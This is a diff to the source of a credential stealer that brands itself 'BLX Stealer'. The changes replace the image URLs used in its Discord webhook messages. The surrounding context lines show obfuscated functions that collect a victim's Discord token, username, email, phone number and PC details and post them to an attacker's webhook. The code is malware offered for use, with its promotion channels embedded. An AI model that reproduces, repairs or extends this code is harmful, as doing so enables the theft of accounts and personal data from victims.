@@ -837,7 +837,7 @@ def UP104D70K3N(token, path):
     username, hashtag, email, idd, pfp, flags, nitro, phone = G3770K3N1NF0(token)
 
     if pfp == None: 
-        pfp = "https://cdn.discordapp.com/attachments/1170081525312786475/1194217774122274846/lol.jpg?ex=65af8cf8&is=659d17f8&hm=0b714a90102a5f6f3d987f98bd5054b5735f1ee142f4614dd4f48d8ead1bc213&"
+        pfp = "https://cdn.discordapp.com/attachments/1207404349177724988/1247483882857828352/Picsart_24-06-04_12-35-17-582.jpg?ex=66603166&is=665edfe6&hm=21f8dbb5c91a74c32d25411343f3b446495aead54f662fec2868a4d1c0677fed&"
     else:
         pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"
 
@@ -896,14 +896,14 @@ def UP104D70K3N(token, path):
                 },
             "footer": {
                 "text": "BLX Stealer | discord.gg/blx",
-                "icon_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
+                "icon_url": "https://cdn.discordapp.com/attachments/1207404349177724988/1247483882857828352/Picsart_24-06-04_12-35-17-582.jpg?ex=66603166&is=665edfe6&hm=21f8dbb5c91a74c32d25411343f3b446495aead54f662fec2868a4d1c0677fed&"
                 },
             "thumbnail": {
                 "url": f"{pfp}"
                 }
             }
         ],
-        "avatar_url": "https://cdn.discordapp.com/attachments/1170081525312786475/1194217774122274846/lol.jpg?ex=65af8cf8&is=659d17f8&hm=0b714a90102a5f6f3d987f98bd5054b5735f1ee142f4614dd4f48d8ead1bc213&",
+        "avatar_url": "https://cdn.discordapp.com/attachments/1207404349177724988/1247483882857828352/Picsart_24-06-04_12-35-17-582.jpg?ex=66603166&is=665edfe6&hm=21f8dbb5c91a74c32d25411343f3b446495aead54f662fec2868a4d1c0677fed&",
         "username": "BLX Stealer | t.me/blxstealer",
         "attachments": []
         }
@@ -942,12 +942,12 @@ class PcInfo:
                     "color": color,
                     "footer": {
                         "text": "BLX Stealer | discord.gg/blx",
-                        "icon_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
+                        "icon_url": "https://cdn.discordapp.com/attachments/1207404349177724988/1247483882857828352/Picsart_24-06-04_12-35-17-582.jpg?ex=66603166&is=665edfe6&hm=21f8dbb5c91a74c32d25411343f3b446495aead54f662fec2868a4d1c0677fed&"
                     }
                 }
             ],
             "username": "BLX Stealer | t.me/blxstealer",
-            "avatar_url": "https://cdn.discordapp.com/attachments/1170081525312786475/1194217774122274846/lol.jpg?ex=65af8cf8&is=659d17f8&hm=0b714a90102a5f6f3d987f98bd5054b5735f1ee142f4614dd4f48d8ead1bc213&",
+            "avatar_url": "https://cdn.discordapp.com/attachments/1207404349177724988/1247483882857828352/Picsart_24-06-04_12-35-17-582.jpg?ex=66603166&is=665edfe6&hm=21f8dbb5c91a74c32d25411343f3b446495aead54f662fec2868a4d1c0677fed&",
             "attachments": []
             }
     L04DUr118(hook, data=dumps(data).encode(), headers=headers)
@@ -1036,12 +1036,12 @@ data = {
                     "color": color,
                     "footer": {
                         "text": "BLX Stealer | discord.gg/blx",
-                        "icon_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
+                        "icon_url": "https://cdn.discordapp.com/attachments/1207404349177724988/1247483882857828352/Picsart_24-06-04_12-35-17-582.jpg?ex=66603166&is=665edfe6&hm=21f8dbb5c91a74c32d25411343f3b446495aead54f662fec2868a4d1c0677fed&"
                     }
                 }
             ],
             "username": "BLX Stealer | t.me/blxstealer",
-            "avatar_url": "https://cdn.discordapp.com/attachments/1170081525312786475/1194217774122274846/lol.jpg?ex=65af8cf8&is=659d17f8&hm=0b714a90102a5f6f3d987f98bd5054b5735f1ee142f4614dd4f48d8ead1bc213&",
+            "avatar_url": "https://cdn.discordapp.com/attachments/1207404349177724988/1247483882857828352/Picsart_24-06-04_12-35-17-582.jpg?ex=66603166&is=665edfe6&hm=21f8dbb5c91a74c32d25411343f3b446495aead54f662fec2868a4d1c0677fed&",
             "attachments": []
             }
 L04DUr118(hook, data=dumps(data).encode(), headers=headers)
@@ -1074,12 +1074,12 @@ def UP104D(name, link):
                     "color": color,
                     "footer": {
                         "text": "BLX Stealer | discord.gg/blx",
-                        "icon_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
+                        "icon_url": "https://cdn.discordapp.com/attachments/1207404349177724988/1247483882857828352/Picsart_24-06-04_12-35-17-582.jpg?ex=66603166&is=665edfe6&hm=21f8dbb5c91a74c32d25411343f3b446495aead54f662fec2868a4d1c0677fed&"
                     }
                 }
             ],
             "username": "BLX Stealer | t.me/blxstealer",
-            "avatar_url": "https://cdn.discordapp.com/attachments/1170081525312786475/1194217774122274846/lol.jpg?ex=65af8cf8&is=659d17f8&hm=0b714a90102a5f6f3d987f98bd5054b5735f1ee142f4614dd4f48d8ead1bc213&",
+            "avatar_url": "https://cdn.discordapp.com/attachments/1207404349177724988/1247483882857828352/Picsart_24-06-04_12-35-17-582.jpg?ex=66603166&is=665edfe6&hm=21f8dbb5c91a74c32d25411343f3b446495aead54f662fec2868a4d1c0677fed&",
             "attachments": []
             }
         L04DUr118(hook, data=dumps(data).encode(), headers=headers)
@@ -1100,12 +1100,12 @@ def UP104D(name, link):
                     "color": color,
                     "footer": {
                         "text": "BLX Stealer | discord.gg/blx",
-                        "icon_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
+                        "icon_url": "https://cdn.discordapp.com/attachments/1207404349177724988/1247483882857828352/Picsart_24-06-04_12-35-17-582.jpg?ex=66603166&is=665edfe6&hm=21f8dbb5c91a74c32d25411343f3b446495aead54f662fec2868a4d1c0677fed&"
                     }
                 }
             ],
             "username": "BLX Stealer | t.me/blxstealer",
-            "avatar_url": "https://cdn.discordapp.com/attachments/1170081525312786475/1194217774122274846/lol.jpg?ex=65af8cf8&is=659d17f8&hm=0b714a90102a5f6f3d987f98bd5054b5735f1ee142f4614dd4f48d8ead1bc213&",
+            "avatar_url": "https://cdn.discordapp.com/attachments/1207404349177724988/1247483882857828352/Picsart_24-06-04_12-35-17-582.jpg?ex=66603166&is=665edfe6&hm=21f8dbb5c91a74c32d25411343f3b446495aead54f662fec2868a4d1c0677fed&",
             "attachments": []
             }
         L04DUr118(hook, data=dumps(data).encode(), headers=headers)
@@ -1128,12 +1128,12 @@ def UP104D(name, link):
                 },
                 "footer": {
                     "text": "BLX Stealer | discord.gg/blx",
-                    "icon_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
+                    "icon_url": "https://cdn.discordapp.com/attachments/1207404349177724988/1247483882857828352/Picsart_24-06-04_12-35-17-582.jpg?ex=66603166&is=665edfe6&hm=21f8dbb5c91a74c32d25411343f3b446495aead54f662fec2868a4d1c0677fed&"
                 }
                 }
             ],
             "username": "BLX Stealer | t.me/blxstealer",
-            "avatar_url": "https://cdn.discordapp.com/attachments/1170081525312786475/1194217774122274846/lol.jpg?ex=65af8cf8&is=659d17f8&hm=0b714a90102a5f6f3d987f98bd5054b5735f1ee142f4614dd4f48d8ead1bc213&",
+            "avatar_url": "https://cdn.discordapp.com/attachments/1207404349177724988/1247483882857828352/Picsart_24-06-04_12-35-17-582.jpg?ex=66603166&is=665edfe6&hm=21f8dbb5c91a74c32d25411343f3b446495aead54f662fec2868a4d1c0677fed&",
             "attachments": []
             }
         L04DUr118(hook, data=dumps(data).encode(), headers=headers)
@@ -1313,12 +1313,12 @@ def G47H3rZ1P5(paths1, paths2, paths3):
             "color": color,
             "footer": {
                 "text": "BLX Stealer | discord.gg/blx",
-                "icon_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
+                "icon_url": "https://cdn.discordapp.com/attachments/1207404349177724988/1247483882857828352/Picsart_24-06-04_12-35-17-582.jpg?ex=66603166&is=665edfe6&hm=21f8dbb5c91a74c32d25411343f3b446495aead54f662fec2868a4d1c0677fed&"
             }
             }
         ],
         "username": "BLX Stealer | t.me/blxstealer",
-        "avatar_url": "https://cdn.discordapp.com/attachments/1170081525312786475/1194217774122274846/lol.jpg?ex=65af8cf8&is=659d17f8&hm=0b714a90102a5f6f3d987f98bd5054b5735f1ee142f4614dd4f48d8ead1bc213&",
+        "avatar_url": "https://cdn.discordapp.com/attachments/1207404349177724988/1247483882857828352/Picsart_24-06-04_12-35-17-582.jpg?ex=66603166&is=665edfe6&hm=21f8dbb5c91a74c32d25411343f3b446495aead54f662fec2868a4d1c0677fed&",
         "attachments": []
     }
     L04DUr118(hook, data=dumps(data).encode(), headers=headers)
